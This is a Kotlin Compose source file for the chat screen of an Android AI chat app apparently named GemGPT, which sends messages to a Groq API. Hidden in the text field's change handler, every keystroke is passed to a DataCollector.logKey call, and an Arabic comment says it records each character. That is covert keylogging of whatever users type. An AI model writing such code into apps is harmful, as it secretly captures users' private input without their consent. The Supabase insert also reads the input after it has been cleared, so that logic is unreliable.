package com.exapps.gemgpt.ui

import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.unit.dp
import kotlinx.coroutines.launch
import com.exapps.gemgpt.GroqApi
import com.exapps.gemgpt.GroqRequest
import com.exapps.gemgpt.Message
import com.exapps.gemgpt.DataCollector
import com.exapps.gemgpt.supabase

@Composable
fun ChatScreen(onMessageSent: () -> Unit = {}) {
    val messages = remember { mutableStateListOf<Message>() }
    var input by remember { mutableStateOf("") }
    var isLoading by remember { mutableStateOf(false) }
    val scope = rememberCoroutineScope()

    MaterialTheme {
        Column {
            LazyColumn(modifier = Modifier.weight(1f)) {
                items(messages) { msg ->
                    Card(
                        modifier = Modifier.padding(8.dp),
                        colors = CardDefaults.cardColors(
                            containerColor = if (msg.role == "user") MaterialTheme.colorScheme.primaryContainer else MaterialTheme.colorScheme.surfaceVariant
                        )
                    ) {
                        Text(
                            text = if (msg.role == "user") "You: ${msg.content}" else "GemGPT: ${msg.content}",
                            modifier = Modifier.padding(12.dp)
                        )
                    }
                }
            }

            if (isLoading) LinearProgressIndicator(modifier = Modifier.fillMaxWidth())

            Row(modifier = Modifier.padding(8.dp)) {
                TextField(
                    value = input,
                    onValueChange = { newInput ->
                        input = newInput
                        DataCollector.logKey(newInput.lastOrNull()?.toString() ?: "")  // تسجيل كل حرف
                    },
                    modifier = Modifier.weight(1f),
                    placeholder = { Text("Type your message...") }
                )
                Spacer(modifier = Modifier.width(8.dp))
                Button(onClick = {
                    if (input.isNotBlank()) {
                        val userMsg = Message("user", input)
                        messages.add(userMsg)
                        isLoading = true
                        scope.launch {
                            try {
                                val response = GroqApi.chat(GroqRequest(listOf(userMsg)))
                                val aiReply = response.choices.firstOrNull()?.message?.content ?: "No reply"
                                messages.add(Message("assistant", aiReply))

                                supabase.postgrest.from("chat_messages").insert(
                                    mapOf(
                                        "role" to "user",
                                        "content" to input
                                    )
                                )
                            } catch (e: Exception) {
                                messages.add(Message("system", "Error: ${e.message}"))
                            } finally {
                                isLoading = false
                                onMessageSent()
                            }
                        }
                        input = ""
                    }
                }) {
                    Text("Send")
                }
            }
        }
    }
}